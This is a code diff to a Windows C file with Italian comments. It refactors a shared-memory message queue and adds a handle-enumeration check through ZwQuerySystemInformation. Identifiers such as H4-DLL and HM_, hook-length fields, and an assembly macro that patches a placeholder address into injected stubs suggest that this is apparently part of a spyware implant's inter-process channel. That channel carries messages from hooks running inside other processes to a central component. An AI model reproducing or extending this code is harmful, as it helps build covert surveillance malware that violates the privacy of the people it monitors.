@@ -5,10 +5,12 @@
 #include "common.h"
 #include "H4-DLL.h"
 #include "bss.h"
+#include "HM_IpcModule.h"
+
 // La memoria per la lettura e' composta da una serie di strutture che il server scrive e tutti i client
 // possono leggere. La memoria per la scrittura implementa una coda di messaggi in cui i client scrivono
 // e da cui il server legge.
-// I client scrivono message_struct e leggono BYTE che poi loro casteranno.
+// I client scrivono IPC_MESSAGE e leggono BYTE che poi loro casteranno.
 
 // Valori base (modificabili a seconda delle esigenze)
 #define MAX_MSG_LEN 0x400 // Lunghezza di un messaggio
@@ -16,12 +18,12 @@
 #define SHARE_MEMORY_READ_SIZE (WRAPPER_COUNT*WRAPPER_MAX_SHARED_MEM) // Dimensione spazio per la lettura delle configurazioni da parte dei wrapper                                
 
 // Valori derivati
-#define SHARE_MEMORY_WRITE_SIZE ((MAX_MSG_NUM * sizeof(message_struct))+2)
+#define SHARE_MEMORY_WRITE_SIZE ((MAX_MSG_NUM * sizeof(IPC_MESSAGE))+2)
 
 
 // Macro di supporto
 #define DATA_SUPPORT DWORD dwFuncLen; DWORD dwFuncAdd; DWORD dwDataAdd;
-typedef struct { DATA_SUPPORT; } Generic_data_support;
+
 #define INIT_SFUNC(STRTYPE)			STRTYPE *pData; \
 									__asm    MOV EBX,69696969h \
 									__asm	 MOV DWORD PTR SS:[pData], EBX \
@@ -35,24 +37,7 @@ typedef struct { DATA_SUPPORT; } Generic_data_support;
 									__asm REP MOVSB }
 
 
-// Struttura di un messaggio scritto dai client
-// Il corpo del messaggio DEVE essere sempre l'ultimo elemento (vedi IPCServerRead)
-// XXX Se modifico va cabiato anche in AM_Core
-typedef struct {
-	BYTE status;
-#define STATUS_FREE 0 // Libero
-#define STATUS_BUSY 1 // In scrittura
-#define STATUS_WRIT 2 // Scritto
-	FILETIME time_stamp;
-	DWORD wrapper_tag;
-	DWORD message_len;
-	DWORD flags;
-	DWORD priority;
-#define IPC_LOW_PRIORITY 0x0
-#define IPC_DEF_PRIORITY 0x10
-#define IPC_HI_PRIORITY  0x100
-	BYTE message[MAX_MSG_LEN];
-} message_struct;
+
 
 extern BOOL IsVista(DWORD* integrity_level);
 void* FindTokenObject(HANDLE Handle);
@@ -65,19 +50,14 @@ void* IPC_SHM_Kernel_Object = NULL;
 //    IPCClientRead     //
 //						//
 //////////////////////////
-typedef struct {
-	COMMONDATA;
-	BYTE* mem_addr;
-} IPCClientRead_data_struct;
-
-IPCClientRead_data_struct IPCClientRead_data;
+IPC_CLIENT_READ ipc_read;
 
 
 // Ritorna l'indirizzo di memoria della configurazione di un dato wrapper
 // Torna NULL se fallisce
 BYTE* WINAPI IPCClientRead(DWORD wrapper_tag)
 {
-	INIT_SFUNC(IPCClientRead_data_struct);
+	INIT_SFUNC(IPC_CLIENT_READ);
 	if (!pData->mem_addr)
 		return NULL;
 
@@ -87,44 +67,32 @@ BYTE* WINAPI IPCClientRead(DWORD wrapper_tag)
 DWORD IPCClientRead_setup(DWORD dummy)
 {
 	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_READ, FALSE, shared.SHARE_MEMORY_READ_NAME);
-	IPCClientRead_data.mem_addr = 0;
+	ipc_read.mem_addr = 0;
 
 	// Se non riesce ad aprire l'oggetto setta mem_addr a NULL e la funzione ritornera' sempre NULL
 	// Chi la richiama dovra' controllare che il valore di ritorno sia diverso da NULL prima di leggere
 	// dalla memoria
 	if (h_file)
-		IPCClientRead_data.mem_addr = (BYTE*)FNC(MapViewOfFile)(h_file, FILE_MAP_READ, 0, 0, SHARE_MEMORY_READ_SIZE);
+		ipc_read.mem_addr = (BYTE*)FNC(MapViewOfFile)(h_file, FILE_MAP_READ, 0, 0, SHARE_MEMORY_READ_SIZE);
 
-	IPCClientRead_data.dwHookLen = 150;
+	ipc_read.dwHookLen = 150;
 	return 0;
 }
-
-
 
 //////////////////////////
 //						//
 //    IPCClientWrite    //
 //						//
 //////////////////////////
-typedef void (WINAPI* GetSystemTimeAsFileTime_t) (LPFILETIME);
-typedef struct {
-	COMMONDATA;
-	message_struct* mem_addr;
-	GetSystemTimeAsFileTime_t pGetSystemTimeAsFileTime;
-	DWORD increment;
-	DWORD old_low_part;
-	DWORD old_hi_part;
-} IPCClientWrite_data_struct;
-
-IPCClientWrite_data_struct IPCClientWrite_data;
+IPC_CLIENT_WRITE ipc_write;
 
 // Torna TRUE se ha scritto, FALSE se fallisce
 BOOL WINAPI IPCClientWrite(DWORD wrapper_tag, BYTE* message, DWORD msg_len, DWORD flags, DWORD priority)
 {
 	unsigned int i, j;
-	message_struct* pMessage;
+	IPC_MESSAGE* pMessage;
 	FILETIME time_stamp;
-	INIT_SFUNC(IPCClientWrite_data_struct);
+	INIT_SFUNC(IPC_CLIENT_WRITE);
 	// Fallisce se la memoria non e' presente o se il messaggio e' troppo grosso
 	// per essere scritto
 	if (!pData->mem_addr || msg_len > MAX_MSG_LEN || !message)
@@ -195,27 +163,27 @@ DWORD IPCClientWrite_setup(DWORD dummy)
 	HANDLE h_file;
 
 	h_krn = GetModuleHandle("kernel32.dll");
-	IPCClientWrite_data.pGetSystemTimeAsFileTime = (GetSystemTimeAsFileTime_t)HM_SafeGetProcAddress(h_krn, (char*)"GetSystemTimeAsFileTime");
+	ipc_write.pGetSystemTimeAsFileTime = (GetSystemTimeAsFileTime_t)HM_SafeGetProcAddress(h_krn, (char*)"GetSystemTimeAsFileTime");
 
 	h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, shared.SHARE_MEMORY_WRITE_NAME);
-	IPCClientWrite_data.mem_addr = 0;
-	IPCClientWrite_data.old_low_part = 0;
-	IPCClientWrite_data.old_hi_part = 0;
-	IPCClientWrite_data.increment = 0;
+	ipc_write.mem_addr = 0;
+	ipc_write.old_low_part = 0;
+	ipc_write.old_hi_part = 0;
+	ipc_write.increment = 0;
 
 	// Se non riesce ad aprire l'oggetto setta mem_addr a NULL e la funzione ritornera' sempre NULL
 	// Chi la richiama dovra' controllare che il valore di ritorno sia diverso da NULL prima di leggere
 	// dalla memoria
 	if (h_file)
-		IPCClientWrite_data.mem_addr = (message_struct*)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);
+		ipc_write.mem_addr = (IPC_MESSAGE*)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);
 
-	IPCClientWrite_data.dwHookLen = 800;
+	ipc_write.dwHookLen = 800;
 	return 0;
 }
 
 
 //-------------------- FUNZIONI per il Server ----------------------
-message_struct* server_mem_addr_read = NULL;
+IPC_MESSAGE* server_mem_addr_read = NULL;
 BYTE* server_mem_addr_write = NULL;
 
 void IPCServerWrite(DWORD wrapper_tag, BYTE* buff, DWORD size)
@@ -223,33 +191,6 @@ void IPCServerWrite(DWORD wrapper_tag, BYTE* buff, DWORD size)
 	if (server_mem_addr_write)
 		memcpy(server_mem_addr_write + wrapper_tag, buff, size);
 }
-
-
-// Torna TRUE se ha letto qualcosa. Non e' bloccante
-// XXX Non piu' usata e non aggiornata con garanzia di ordinamento
-/*BOOL IPCServerRead(message_struct *serv_buff)
-{
-	unsigned int i;
-	message_struct *pMessage;
-
-	if (!server_mem_addr_read)
-		return FALSE;
-
-	for (i=0, pMessage=server_mem_addr_read; i<MAX_MSG_NUM; i++, pMessage++)
-		if (pMessage->status == STATUS_WRIT) {
-			// Assumendo che il coprpo del messaggio sia alla fine, copia soltanto il pezzo di messaggio
-			// valorizzato (header del messaggio + msg_len)
-			// Il check che msg_len sia minore di MAX_MSG_LEN viene fatto dalla funzione
-			memcpy(serv_buff, pMessage, sizeof(message_struct) - MAX_MSG_LEN + pMessage->message_len);
-			pMessage->status = STATUS_FREE;
-			return TRUE;
-		}
-
-	// Non ci sono elementi da leggere
-	return FALSE;
-
-}*/
-
 
 // Ritorna TRUE se tm1 e' piu' vecchio di tm2
 BOOL is_older(FILETIME* tm1, FILETIME* tm2)
@@ -266,10 +207,10 @@ BOOL is_older(FILETIME* tm1, FILETIME* tm2)
 // Piu' veloce della Read, ritorna direttamente il messaggio nella shared memory (non fa la memcpy)
 // Ma necessita che poi il messaggio sia rimosso a mano dopo che e' stato completato il dispatch
 // Garantiesce l'ordinamento
-message_struct* IPCServerPeek()
+IPC_MESSAGE* IPCServerPeek()
 {
 	unsigned int i;
-	message_struct* pMessage, * oldest_msg = NULL;
+	IPC_MESSAGE* pMessage, * oldest_msg = NULL;
 	FILETIME oldest_time;
 
 	if (!server_mem_addr_read)
@@ -294,7 +235,7 @@ message_struct* IPCServerPeek()
 
 
 // Rimuove dalla coda un messaggio preso con IPCServerPeek
-void IPCServerRemove(message_struct* msg)
+void IPCServerRemove(IPC_MESSAGE* msg)
 {
 	msg->status = STATUS_FREE;
 }
@@ -343,7 +284,7 @@ BOOL IPCServerInit()
 	if (h_file) {
 		if (GetLastError() == ERROR_ALREADY_EXISTS)
 			ret_val = FALSE;
-		server_mem_addr_read = (message_struct*)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);
+		server_mem_addr_read = (IPC_MESSAGE*)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);
 	}
 
 	// Se esisteva gia' non ci deve scrivere
@@ -358,4 +299,76 @@ BOOL IPCServerInit()
 	return ret_val;
 }
 
+typedef DWORD PROCESSINFOCLASS;
+typedef struct _SYSTEM_HANDLE_INFORMATION {
+	ULONG  ProcessId;
+	UCHAR  ObjectTypeNumber;
+	UCHAR  Flags;
+	USHORT Handle;
+	PVOID  Object;
+	ACCESS_MASK  GrantedAccess;
+} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
+#define SystemHandleInformation 16
+typedef DWORD(WINAPI* ZWQUERYSYSTEMINFORMATION)(
+	PROCESSINFOCLASS ProcessInformationClass,
+	PVOID ProcessInformation,
+	ULONG ProcessInformationLength,
+	PULONG ReturnLength
+	);
 
+
+#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
+#define STATUS_SUCCESS 0
+BOOL CheckIPCAlreadyExist(DWORD pid)
+{
+	static ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;
+	LONG Status;
+	static DWORD* p = NULL;
+	int i;
+	DWORD n = 0x4000;
+	HMODULE hNtdll;
+	PSYSTEM_HANDLE_INFORMATION hinfo;
+	BOOL now_created = FALSE;
+
+	if (IPC_SHM_Kernel_Object == NULL)
+		return TRUE;
+
+	for (i = 0; i < 2; i++) {
+		if (p == NULL) {
+			if (ZwQuerySystemInformation == NULL) {
+				hNtdll = GetModuleHandle("ntdll.dll");
+				ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
+				if (!ZwQuerySystemInformation)
+					return TRUE;
+			}
+
+			if (!(p = (DWORD*)malloc(n)))
+				return TRUE;
+
+			while ((Status = ZwQuerySystemInformation(SystemHandleInformation, p, n, 0)) == STATUS_INFO_LENGTH_MISMATCH) {
+				SAFE_FREE(p);
+				n *= 4;
+				if (!(p = (DWORD*)malloc(n)))
+					return TRUE;
+			}
+			if (Status != STATUS_SUCCESS) {
+				SAFE_FREE(p);
+				return TRUE;
+			}
+			now_created = TRUE;
+		}
+
+		hinfo = PSYSTEM_HANDLE_INFORMATION(p + 1);
+		for (DWORD i = 0; i < *p; i++) {
+			if (hinfo[i].ProcessId == pid && hinfo[i].Object == (PVOID) IPC_SHM_Kernel_Object) {
+				return TRUE;
+			}
+		}
+
+		if (now_created)
+			return FALSE;
+
+		SAFE_FREE(p);
+	}
+	return FALSE;
+}
